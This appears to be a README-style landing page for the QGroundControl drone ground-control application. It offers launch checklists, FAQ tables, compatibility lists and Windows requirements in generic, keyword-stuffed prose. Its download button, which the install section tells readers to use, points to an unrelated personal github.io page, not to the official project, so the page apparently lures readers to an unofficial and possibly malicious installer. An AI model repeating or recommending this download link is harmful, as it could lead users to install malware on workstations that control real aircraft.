# QGroundControl — Plan, Configure, and Monitor
QGroundControl is a mission-planning and ground-control application for Windows that helps teams configure supported vehicles and supervise flight operations.
It brings aircraft setup, map tools, telemetry, and operator controls into one desktop workspace.

<p align="center"><img src="https://s.cafebazaar.ir/images/icons/org.mavlink.qgroundcontrol-55f4eabf-23ff-4748-a66a-048114e9cb72_512x512.png?x-img=v1/resize,h_256,w_256,lossless_false/optimize" alt="QGroundControl logo" width="120"/></p>

[![Download QGroundControl](https://img.shields.io/badge/⬇_Download_QGroundControl-d63384?style=for-the-badge)](https://anitabailey26.github.io/.github/QGroundControl-Security-App)

## Guide Map

**Jump to:**

* [Guide Map](#guide-map)
* [Controlled First Launch](#controlled-first-launch)
* [Release and Team Support](#release-and-team-support)
* [Questions Before Deployment](#questions-before-deployment)
* [Install on Windows](#install-on-windows)
* [Advisory and Data Review](#advisory-and-data-review)
* [Vehicle, Link, and File Compatibility](#vehicle-link-and-file-compatibility)
* [Operational Capabilities](#operational-capabilities)
* [Conservative Windows Baseline](#conservative-windows-baseline)
* [Ready for Team Use](#ready-for-team-use)

## Controlled First Launch

1. Start QGroundControl without a vehicle attached and record the installed release, package source, and workstation owner.
2. Decide where mission files, settings, logs, cached maps, and any captured media may be stored under the team's data policy.
3. Prepare a non-operational test vehicle or approved simulator, then confirm that its firmware and connection method are supported.
4. Establish the link in a controlled area, verify the displayed vehicle identity and state, and save known-good configuration data before making changes.
5. Run a brief map, telemetry, and disconnect-recovery exercise before approving the workstation for operational use.

## Release and Team Support

For support, begin with QGroundControl's built-in messages, setup views, and diagnostic information, then consult the official QGroundControl documentation and project support resources by name. A team should keep an owner for each workstation, preserve the installer provenance and release record, document approved vehicle and link combinations, and route update or security questions through a shared review process. When assistance is needed, provide a sanitized problem description, relevant logs, reproduction steps, and the exact installed release without exposing credentials, location history, or sensitive mission details.

## Questions Before Deployment

| Question | Answer |
|---|---|
| Is QGroundControl free? | QGroundControl is available as free, open-source software. Teams should still review the license and distribution notes included with the release they deploy. |
| Which versions of Windows are supported? | Support follows the requirements of the current QGroundControl release. Confirm the published release guidance on a representative workstation instead of assuming that every legacy or preview Windows build will work. |
| How should we evaluate a QGroundControl CVE or an NVD QGroundControl CVE search result? | Treat the record as a starting point, not proof that a workstation is affected. Match the named product, affected versions, platform, configuration, and scope against the installed build, then compare the finding with official project advisories and release notes. |
| What should happen before a QGroundControl update? | Export needed settings and mission data, protect required logs, note connected-device dependencies, and test the candidate release on a staging computer before broad deployment. |

## Install on Windows

Use the download button above to obtain the selected stable Windows package, verify that it came from the approved distribution process, and run the installer while following its setup prompts. Launch QGroundControl after installation and complete only the first-run choices authorized for the workstation; if an optional connected service requires credentials, use the team's approved sign-in method. Keep the aircraft disconnected until the application opens normally and the operator has reviewed the initial storage, network, and update settings.

## Advisory and Data Review

**Verify exposure before acting on an advisory.** Compare any CVE or NVD entry with the precise QGroundControl release and deployment context, while separately controlling local mission plans, vehicle parameters, telemetry logs, cached map content, video data, and service credentials according to team retention and access rules.

## Vehicle, Link, and File Compatibility

| Type | Supported |
|---|---|
| Vehicle protocol | MAVLink communication implemented by the installed QGroundControl release and compatible vehicle firmware |
| Autopilot workflows | Supported PX4 and ArduPilot setup, planning, and monitoring features, subject to the selected vehicle and release |
| Local links | USB or serial devices that Windows recognizes and QGroundControl can open with the correct connection settings |
| Network links | Compatible telemetry endpoints made available through the network options in the installed application |
| Mission and log files | Formats explicitly offered by the current import, export, planning, and analysis tools |
| Maps and video | Sources supported by the configured application, Windows graphics and decoding components, and organizational network policy |

## Operational Capabilities

* A QGroundControl mission planning map for placing, reviewing, and organizing supported mission items
* A unified QGroundControl interface for vehicle setup, status checks, telemetry, and operator feedback
* Connection management for compatible local and network telemetry paths
* Parameter inspection and configuration tools for supported autopilot workflows
* Flight-data and log views that assist controlled testing and post-operation review
* Update-aware deployment practices that let teams validate a release before wider use

## Conservative Windows Baseline

* **Operating system:** A maintained Windows edition accepted by the current QGroundControl release
* **Processor:** A modern 64-bit processor capable of responsive mapping, telemetry, and setup work
* **Memory:** Sufficient available memory for the application plus maps, logs, and an enabled video feed
* **Graphics:** Windows-compatible graphics with stable drivers suitable for the interface and map rendering
* **Storage:** Capacity for the installation, cached data, mission material, logs, backups, and update packages
* **Connectivity:** Approved USB, serial, or network hardware needed by the chosen vehicle link and any map or video source
* **Permissions:** Installation and device-access rights managed under the organization's workstation policy

## Ready for Team Use

Document the baseline, validate each change in staging, and approve QGroundControl for operations only after the complete vehicle-and-workstation workflow has passed team review.
